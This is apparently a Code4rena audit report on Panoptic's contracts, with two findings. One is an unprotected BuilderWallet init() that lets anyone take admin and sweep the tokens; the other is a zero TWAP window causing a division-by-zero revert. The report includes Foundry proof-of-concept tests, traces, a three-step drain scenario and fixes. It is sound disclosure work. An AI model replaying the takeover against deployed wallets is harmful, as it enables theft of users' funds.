# Panoptic Contest

Panoptic Next Core Contest || Panoptic Next core: A DeFi options protocol || Dec 19th, 2025 - Jan 7th, 2026 on [Code4rena](https://code4rena.com/audits)

My Finding Summary

|ID|Title|Severity|
|:-:|:---|:------:|
|[H-01](#h-01-unrestricted-initialization-allows-_complete-builderwallet-function)|Unrestricted Initialization Allows Complete BuilderWallet Takeover|HIGH|
|[L-01](#l-01-missing-twap-window-_validation-causes-oracle-reverts-and-invalid-pricing)|Missing TWAP Window Validation Causes Oracle Reverts and Invalid Pricing|LOW|

## [H-01] Unrestricted Initialization Allows Complete BuilderWallet Takeover

### Description

The BuilderWallet contract lacks access control on its `init()` function, allowing any address to assign itself as builderAdmin. Since builderAdmin is the sole authority permitted to call `sweep()`, an attacker can unilaterally gain withdrawal rights and drain all ERC20 tokens held by the wallet.

```solidity
    function init(address _builderAdmin) external { //q unrestricted 
        builderAdmin = _builderAdmin;
    }
```

```solidity
    function sweep(address token, address to) external {
        if (msg.sender != builderAdmin) revert Errors.NotBuilder(); //q only builderAdmin can call, but builderAdmin isn't restricted

        uint256 bal = IERC20(token).balanceOf(address(this));
        if (bal == 0) return;

        bool ok = IERC20(token).transfer(to, bal);
        if (!ok) {
            // `from` is this wallet, `balance` is pre-transfer token balance
            revert Errors.TransferFailed(token, address(this), bal, bal);
        }
    }
```

### Impact

An attacker can permanently seize control of a newly deployed BuilderWallet and irreversibly drain all funds sent to it. This results in total loss of assets and fully compromises the wallet’s security guarantees.

### Root Cause

The factory's deployBuilder currently calls `BuilderWallet(wallet).init(builderAdmin)` immediately after CREATE2, but that does not prevent an attacker from re-calling init and hijacking the wallet.
The init() function is:

* publicly callable

* not restricted to the factory

* not protected against re-initialization

This violates fundamental access control invariants and directly exposes the wallet’s funds to arbitrary theft.

### Recommended Mitigation

Restrict `init()` to the factory and enforce one-time initialization, or move builderAdmin assignment into the constructor.

```solidity
function init(address _builderAdmin) external {
    if (msg.sender != FACTORY) revert NotFactory();
    if (builderAdmin != address(0)) revert AlreadyInitialized();
    builderAdmin = _builderAdmin;
}
```

### Proof of Concept

Create BuilderWalletInitPoC.t.sol under test/foundry/core/ and paste the following;

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "contracts/RiskEngine.sol";
import "contracts/tokens/ERC20Minimal.sol";

contract TestToken is ERC20Minimal {
    string public name = "TestToken";
    string public symbol = "TST";
    uint8 public decimals = 18;

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract BuilderWalletInitPoC is Test {
    BuilderFactory factory;
    TestToken token;

    address constant INITIAL_ADMIN = address(0xCAFE);
    address constant ATTACKER = address(0xBEEF);

    function setUp() public {
        // test contract is the owner of the factory
        factory = new BuilderFactory(address(this));
        token = new TestToken();
    }

    /// @notice Demonstrates that `BuilderWallet.init` is callable by anyone and can be used to hijack `builderAdmin`.
    function test_init_hijack_and_sweep() public {
        uint48 builderCode = 1;

        // deploy a builder wallet deterministically and set initial admin
        address wallet = factory.deployBuilder(builderCode, INITIAL_ADMIN);

        // fund the wallet with ERC20 tokens
        uint256 amount = 1_000 ether;
        token.mint(wallet, amount);
        assertEq(token.balanceOf(wallet), amount);

        // ATTACKER calls init(...) to overwrite builderAdmin (this should NOT be allowed)
        vm.prank(ATTACKER);
        BuilderWallet(payable(wallet)).init(ATTACKER);

        // Now ATTACKER can call sweep to drain the tokens
        vm.prank(ATTACKER);
        BuilderWallet(payable(wallet)).sweep(address(token), ATTACKER);

        // wallet should be drained and attacker should hold the tokens
        assertEq(token.balanceOf(wallet), 0);
        assertEq(token.balanceOf(ATTACKER), amount);
    }
}
```

Then run: forge test --mt test_init_hijack_and_sweep -vvvv

Logs:

```java
Ran 1 test for test/foundry/core/BuilderWalletInitPoC.t.sol:BuilderWalletInitPoC
[PASS] test_init_hijack_and_sweep() (gas: 338085)
Traces:
  [357985] BuilderWalletInitPoC::test_init_hijack_and_sweep()
    ├─ [265813] BuilderFactory::deployBuilder(1, 0x000000000000000000000000000000000000cafE)
    │   ├─ [209269] → new BuilderWallet@0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa
    │   │   └─ ← [Return] 1044 bytes of code
    │   ├─ [22395] BuilderWallet::init(0x000000000000000000000000000000000000cafE)
    │   │   └─ ← [Stop]
    │   └─ ← [Return] BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa]
    ├─ [46588] TestToken::mint(BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa], amount: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [549] TestToken::balanceOf(BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21]) [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [495] BuilderWallet::init(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Stop]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [26732] BuilderWallet::sweep(TestToken: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x000000000000000000000000000000000000bEEF)
    │   ├─ [549] TestToken::balanceOf(BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [24823] TestToken::transfer(0x000000000000000000000000000000000000bEEF, 1000000000000000000000 [1e21])
    │   │   ├─ emit Transfer(from: BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa], to: 0x000000000000000000000000000000000000bEEF, amount: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop]
    ├─ [549] TestToken::balanceOf(BuilderWallet: [0x1268e9b0018819eBdb5A19F87C4f5e0DF8F9f8fa]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0) [staticcall]
    │   └─ ← [Return]
    ├─ [549] TestToken::balanceOf(0x000000000000000000000000000000000000bEEF) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [0] VM::assertEq(1000000000000000000000 [1e21], 1000000000000000000000 [1e21]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.74s (516.69ms CPU time)

Ran 1 test suite in 4.56s (3.74s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Attack scenerio:
Assumption- 1. BuilderFactory has correctly deployed and initialized a BuilderWallet.2. Tokens have been transferred to the wallet (via protocol flows). 3. Attacker does not control the factory or owner.

Step 1: Victim setup (legitimate flow)

```solidity
// Factory owner deploys wallet
address wallet = factory.deployBuilder(builderCode, legitAdmin);

// Some protocol logic sends tokens to the wallet
token.transfer(wallet, 1_000e18);
```

At this point:

* builderAdmin == legitAdmin

* Wallet holds funds

* Everything appears safe

Step 2: Attacker takes over the wallet

```solidity
// Anyone can re-initialize the wallet
BuilderWallet(wallet).init(attacker);

// no access control, no one-time guard, overwrites existing admin
```

Step 3: Attacker drain funds

```solidity
BuilderWallet(wallet).sweep(address(token), attacker);
```

Result:

* builderAdmin == attacker

* Entire token balance transferred to attacker

* Permanent loss of funds

(`sweep()` and `init()` does not run under the same call. Therefore, initialization at deployment is not enough)

## [L-01] Missing TWAP Window Validation Causes Oracle Reverts and Invalid Pricing

### Sumary

`PanopticMath::twapFilter` does not validate that `twapWindow` is non-zero. When twapWindow == 0, the function deterministically reverts due to division by zero after constructing invalid TWAP observation windows. This enables DoS and breaks oracle assumptions relied upon by integrators' pricing logic.

### Description

`twapFilter` computes a median-filtered TWAP by dividing a user-supplied twapWindow into 20 evenly spaced sub-intervals, querying Uniswap V3 observations, and averaging tick deltas over each slice.

However, the function never enforces twapWindow > 0.

```solidity
    function twapFilter(IUniswapV3Pool univ3pool, uint32 twapWindow) external view returns (int24) {
        uint32[] memory secondsAgos = new uint32[](20);

        int256[] memory twapMeasurement = new int256[](19);
//q missing twapWindow zer0-check validation
        unchecked {
            // construct the time slots
            for (uint256 i = 0; i < 20; ++i) {
                secondsAgos[i] = uint32(((i + 1) * twapWindow) / 20); 
            }

            // observe the tickCumulative at the 20 pre-defined time slots
            (int56[] memory tickCumulatives, ) = univ3pool.observe(secondsAgos);

            // compute the average tick per 30s window
            for (uint256 i = 0; i < 19; ++i) {
                twapMeasurement[i] = int24(
                    (tickCumulatives[i] - tickCumulatives[i + 1]) / int56(uint56(twapWindow / 20))
                );
            }

            // sort the tick measurements
            int256[] memory sortedTicks = Math.sort(twapMeasurement);

            // Get the median value
            return int24(sortedTicks[9]);
        }
    }
```

When twapWindow == 0, all computed secondsAgos values collapse to zero, causing the oracle to query the same observation repeatedly. More critically, the tick delta is divided by twapWindow / 20, which evaluates to zero and triggers a division-by-zero revert. This revert is unconditional and cannot be mitigated by unchecked arithmetic.

Because twapWindow is an external input, this creates a trivially triggerable revert path that can halt any contract logic relying on this oracle output.

### Impact

An attacker or misconfigured integrator can pass twapWindow == 0, causing:

* Deterministic transaction reverts (denial-of-service)

* Oracle price unavailability

* Cascading failures in pricing, liquidation, or validation logic

Even if integrators code is expected to sanitize inputs, the oracle itself violates the defensive assumptions required for safe integration.

### Comparison to Uniswap Canonical TWAP Guards

Uniswap V3’s own oracle utilities explicitly enforce non-zero and meaningful TWAP windows.

For example, in OracleLibrary.sol:

require(secondsAgo != 0, "BP");

and in higher-level usage patterns, Uniswap assumes:

* secondsAgo > 0

* Observation windows span real time intervals

* Division denominators are never zero

These guards prevent both division-by-zero and degenerate “single-point TWAPs”, preserving oracle correctness.

By contrast, the twapFilter implementation omits these checks, despite replicating Uniswap’s TWAP construction pattern.

### Recommended Mitigation

Add explicit input validation at the start of twapFilter:

```diff
    function twapFilter(IUniswapV3Pool univ3pool, uint32 twapWindow) external view returns (int24) {

        uint32[] memory secondsAgos = new uint32[](20);

        int256[] memory twapMeasurement = new int256[](19);

+       if (twapWindow == 0) revert InvalidTwapWindow();

        unchecked {
            // construct the time slots
            for (uint256 i = 0; i < 20; ++i) {
                secondsAgos[i] = uint32(((i + 1) * twapWindow) / 20);
            }

            // observe the tickCumulative at the 20 pre-defined time slots
            (int56[] memory tickCumulatives, ) = univ3pool.observe(secondsAgos);

           //.........
        }
    }
```

### Proof of Concept

Add the following into PanopticMath.t.sol and run; forge test --mt test_twapFilter_reverts_whenTwapWindowIsZero -vv

```diff
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;
import "forge-std/Test.sol";

// Foundry
// Internal
import {TickMath} from "v3-core/libraries/TickMath.sol";
import {BitMath} from "v3-core/libraries/BitMath.sol";
import {Errors} from "@libraries/Errors.sol";
import {PanopticMathHarness} from "./harnesses/PanopticMathHarness.sol";
import {LiquidityChunk} from "@types/LiquidityChunk.sol";
import {TokenId} from "@types/TokenId.sol";
import {OraclePack, OraclePackLibrary} from "@types/OraclePack.sol";
import {LeftRightUnsigned, LeftRightSigned} from "@types/LeftRight.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {Math} from "@libraries/Math.sol";
import {Constants} from "@libraries/Constants.sol";
// Uniswap
import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
import {FixedPoint96} from "v3-core/libraries/FixedPoint96.sol";
import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
import {FullMath} from "v3-core/libraries/FullMath.sol";
// Test util
import {PositionUtils} from "../testUtils/PositionUtils.sol";
import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
import {UniPoolObservationMock} from "../testUtils/PriceMocks.sol";

import {LiquidityChunk, LiquidityChunkLibrary} from "@types/LiquidityChunk.sol";

/**
 * Test the PanopticMath functionality with Foundry and Fuzzing.
 *
 * @author Axicon Labs Limited
 */
contract PanopticMathTest is Test, PositionUtils {
    using Math for uint256;
    // harness
    PanopticMathHarness harness;
+   UniPoolObservationMock pool;

    // store a few different mainnet pairs - the pool used is part of the fuzz
    IUniswapV3Pool constant USDC_WETH_5 =
        IUniswapV3Pool(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniswapV3Pool constant WBTC_ETH_30 =
        IUniswapV3Pool(0xCBCdF9626bC03E24f779434178A73a0B4bad62eD);
    IUniswapV3Pool constant USDC_WETH_30 =
        IUniswapV3Pool(0x8ad599c3A0ff1De082011EFDDc58f1908eb6e6D8);
    IUniswapV3Pool[3] public pools = [USDC_WETH_5, WBTC_ETH_30, USDC_WETH_30];

    function setUp() public {
        harness = new PanopticMathHarness();
+       // Create a pool mock with at least 1 observation slot
+       pool = new UniPoolObservationMock(1);

+       // Seed a single observation to satisfy observe() assumptions
+       pool.setObservation(0, uint32(block.timestamp), int56(0));
    }

    // Constants for computeInternalMedian tests
    int24 internal constant REFERENCE_TICK = 200000;
    uint256 internal constant INITIAL_EPOCH = 5;

    int24 internal constant MAX_CLAMP_DELTA = 149;

    /*//////////////////////////////////////////////////////////////
                    COMPUTE INTERNAL MEDIAN HELPERS
    //////////////////////////////////////////////////////////////*/

    /// @notice Encodes a set of offsets into the packed oraclePack format for testing.
    function _encodeOraclePack(int16[] memory offsets) internal pure returns (OraclePack) {
        // Assume the input offsets are sorted and create a simple orderMap (0->0, 1->1, etc.)
        uint256 data;
        data |= INITIAL_EPOCH << 232;
        data |= uint256(0xFAC688) << 208; // orderMap for a pre-sorted list
        data |= uint256(uint24(REFERENCE_TICK)) << 96;
        for (uint8 i = 0; i < 8; i++) {
            // Mask with 0xFFF to pack as a 12-bit value
            data |= (uint256(uint16(offsets[i])) & 0x0FFF) << (i * 12);
        }
        return OraclePack.wrap(data);
    }

    /// @notice Decodes the packed data and returns the full tick values IN SORTED ORDER.
    /// This is the key to verifying the orderMap logic is correct.
    function _decodeSortedTicks(OraclePack dataPack) internal view returns (int24[] memory) {
        uint256 data = OraclePack.unwrap(dataPack);
        int24[] memory sortedTicks = new int24[](8);
        int24 refTick = int24(uint24(data >> 96));
        for (uint8 i = 0; i < 8; i++) {
            // i = sorted rank
            uint256 offsetData = (data >> (i * 12)) % 2 ** 12;
            sortedTicks[i] = refTick + harness.int12toInt24(offsetData);
        }
        return sortedTicks;
    }

    /// @notice Generates a standard list of offsets for testing. [0, 10, 20, 30, 40, 50, 60, 70]
    function _generateSortedOffsets(int256 seed) internal pure returns (int16[] memory) {
        int16[] memory offsets = new int16[](8);
        int16 seedStart = seed != 0 ? int16(int256(bound(seed, -1970, 1970))) : int16(0);
        offsets[0] = seedStart;
        offsets[1] = seedStart + 10;
        offsets[2] = seedStart + 20;
        offsets[3] = seedStart + 30;
        offsets[4] = seedStart + 40;
        offsets[5] = seedStart + 50;
        offsets[6] = seedStart + 60;
        offsets[7] = seedStart + 70;
        return offsets;
    }

    // use storage as temp to avoid stack to deeps
    IUniswapV3Pool selectedPool;
    int24 tickSpacing;
    int24 currentTick;

    int24 minTick;
    int24 maxTick;
    int24 lowerBound;
    int24 upperBound;
    int24 strikeOffset;

+   function test_twapFilter_reverts_whenTwapWindowIsZero() public {
+       uint32 twapWindow = 0;
+
+       vm.expectRevert(); // division by zero
+       harness.twapFilter(IUniswapV3Pool(address(pool)), twapWindow);
+   }

// the rest of the test file....
```